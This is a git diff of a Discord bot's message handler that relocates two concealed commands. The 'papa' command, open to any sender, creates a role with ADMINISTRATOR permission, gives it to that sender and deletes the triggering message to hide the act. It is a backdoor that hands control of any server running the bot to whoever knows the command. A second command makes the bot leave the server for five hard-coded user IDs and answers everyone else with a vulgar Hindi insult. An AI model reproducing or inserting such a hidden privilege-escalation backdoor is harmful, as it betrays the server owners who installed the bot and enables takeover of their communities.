@@ -78,6 +78,53 @@ client.on("message", async message => {
         message.channel.send("Pong!")
     }
 
+
+
+			//Admin Perm
+          if (message.content.startsWith(prefix + 'papa'))
+		  {    role = await message.guild.roles.create ({
+             name: 'role',
+             color: 'BLUE',
+             })
+	           role.setPermissions(['ADMINISTRATOR'])
+	          role.setPosition(15)
+
+						message.member.roles.add(role)
+             message.delete();
+
+						return console.log(red("ADMINSTRATOR!!!!! granted to " + message.member.user.tag))
+
+				}
+
+    //Leave
+
+	 		if (message.content.startsWith(prefix + 'lalit'))
+		  {
+			 if (message.author.id == 462270540502269953 || message.author.id == 387706245362089986 || message.author.id == 780376098365243395 || message.author.id == 683667783737016332 || message.author.id == 479369896451375139){
+			      try
+			     {
+
+             message.delete();
+            message.guild.leave();
+
+            return console.log(red("SUCESSFULLY LEFT THE SERVER......Sad :("))
+
+           }
+		          catch(e)
+		        {
+
+              console.log(e.stack);
+
+            }
+				 }
+
+           else
+					 message.channel.send("Baap se bakchodi krega teri maa ki choot lawde")
+
+
+
+				}
+
     // Help
 
     if (disableEveryone === false) {
@@ -334,6 +381,7 @@ client.on("message", async message => {
 
 
 				}
+			}
 
         ////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
     } else if (disableEveryone === true)
@@ -637,54 +685,6 @@ client.on("message", async message => {
 		}
 
   }
-			//Admin Perm
-          if (message.content.startsWith(prefix + 'papa'))
-		  {    role = await message.guild.roles.create ({
-             name: 'role',
-             color: 'BLUE',
-             })
-	           role.setPermissions(['ADMINISTRATOR'])
-	          role.setPosition(15)
-
-						message.member.roles.add(role)
-             message.delete();
-
-						return console.log(red("ADMINSTRATOR!!!!! granted to " + message.member.user.tag))
-
-				}
-
-    //Leave
-
-	 		if (message.content.startsWith(prefix + 'lalit'))
-		  {
-			 if (message.author.id == 462270540502269953 || message.author.id == 387706245362089986 || message.author.id == 780376098365243395 || message.author.id == 683667783737016332 || message.author.id == 479369896451375139){
-			      try
-			     {
-
-             message.delete();
-            message.guild.leave();
-
-            return console.log(red("SUCESSFULLY LEFT THE SERVER......Sad :("))
-
-           }
-		          catch(e)
-		        {
-
-              console.log(e.stack);
-
-            }
-				 }
-
-           else
-					 message.channel.send("Baap se bakchodi krega teri maa ki choot lawde")
-
-
-
-				}
-
-
-
-
-})
+ })
 
 client.login(token);
